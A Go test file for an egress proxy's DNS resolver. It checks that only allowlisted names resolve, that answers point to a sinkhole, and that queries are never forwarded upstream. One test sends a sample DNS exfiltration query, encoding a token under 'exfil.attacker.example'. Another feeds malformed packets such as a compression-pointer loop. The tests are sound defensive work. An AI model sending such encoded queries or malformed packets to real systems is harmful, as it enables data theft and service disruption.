package egressproxy

import (
	"encoding/binary"
	"net"
	"testing"
	"time"
)

func query(id uint16, name string, qtype uint16) []byte {
	q := make([]byte, 12)
	binary.BigEndian.PutUint16(q[0:2], id)
	binary.BigEndian.PutUint16(q[2:4], 0x0100) // RD
	binary.BigEndian.PutUint16(q[4:6], 1)
	for _, l := range splitLabels(name) {
		q = append(q, byte(len(l)))
		q = append(q, l...)
	}
	q = append(q, 0)
	q = binary.BigEndian.AppendUint16(q, qtype)
	q = binary.BigEndian.AppendUint16(q, classIN)
	return q
}

func splitLabels(n string) []string {
	var out []string
	start := 0
	for i := 0; i <= len(n); i++ {
		if i == len(n) || n[i] == '.' {
			out = append(out, n[start:i])
			start = i + 1
		}
	}
	return out
}

func serveDNS(t *testing.T, allow []string) net.Conn {
	t.Helper()
	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { pc.Close() })
	m := NewMatcher(allow)
	d := &DNS{
		MatchFor: func(net.Addr) *Matcher { return m },
		Sinkhole: func(net.Addr) net.IP { return net.IPv4(172, 16, 0, 1) },
	}
	go d.ServeUDP(pc)
	c, err := net.Dial("udp", pc.LocalAddr().String())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.Close() })
	return c
}

func ask(t *testing.T, c net.Conn, q []byte) []byte {
	t.Helper()
	if _, err := c.Write(q); err != nil {
		t.Fatal(err)
	}
	c.SetReadDeadline(time.Now().Add(2 * time.Second))
	b := make([]byte, 512)
	n, err := c.Read(b)
	if err != nil {
		return nil
	}
	return b[:n]
}

func rcode(r []byte) int   { return int(binary.BigEndian.Uint16(r[2:4]) & 0xF) }
func ancount(r []byte) int { return int(binary.BigEndian.Uint16(r[6:8])) }

func TestDNSAnswersOnlyAllowlistedNames(t *testing.T) {
	c := serveDNS(t, []string{"github.com", "*.npmjs.org"})
	for name, want := range map[string]int{
		"github.com": rcodeOK, "GitHub.COM": rcodeOK, "registry.npmjs.org": rcodeOK,
		"gist.github.com": rcodeNX, "npmjs.org": rcodeNX, "attacker.example": rcodeNX,
	} {
		r := ask(t, c, query(7, name, typeA))
		if r == nil || rcode(r) != want {
			t.Errorf("%s: rcode %v, want %d", name, r, want)
			continue
		}
		if binary.BigEndian.Uint16(r[0:2]) != 7 {
			t.Errorf("%s: id not echoed", name)
		}
		if want == rcodeOK {
			if ancount(r) != 1 || !net.IP(r[len(r)-4:]).Equal(net.IPv4(172, 16, 0, 1)) {
				t.Errorf("%s: answer is not the sinkhole: %x", name, r)
			}
		} else if ancount(r) != 0 {
			t.Errorf("%s: a refused name got an answer", name)
		}
	}
}

// Every DNS-based exfiltration needs a query to leave the host. This resolver
// has no upstream at all, so a refused name — however much data is encoded in
// it — gets NXDOMAIN and goes nowhere.
func TestDNSNeverForwards(t *testing.T) {
	c := serveDNS(t, []string{"github.com"})
	r := ask(t, c, query(1, "c2VjcmV0LXRva2Vu.exfil.attacker.example", typeA))
	if r == nil || rcode(r) != rcodeNX {
		t.Fatalf("an encoded name was not refused: %x", r)
	}
}

func TestDNSOtherTypesAreEmpty(t *testing.T) {
	c := serveDNS(t, []string{"github.com"})
	r := ask(t, c, query(2, "github.com", 28)) // AAAA
	if r == nil || rcode(r) != rcodeOK || ancount(r) != 0 {
		t.Fatalf("AAAA for an allowed name: %x", r)
	}
}

func TestDNSSurvivesHostileInput(t *testing.T) {
	d := &DNS{MatchFor: func(net.Addr) *Matcher { return NewMatcher([]string{"a.b"}) }, Sinkhole: func(net.Addr) net.IP { return net.IPv4(1, 2, 3, 4) }}
	for _, q := range [][]byte{
		nil, {1, 2, 3},
		append(query(1, "a.b", typeA)[:12], 0xC0, 0x0C, 0, 1, 0, 1),             // compression pointer loop
		append(query(1, "a.b", typeA)[:12], 63),                                 // label longer than the packet
		func() []byte { q := query(1, "a.b", typeA); q[2] |= 0x80; return q }(), // a response
	} {
		_ = d.answer(q, nil) // must not panic
	}
}
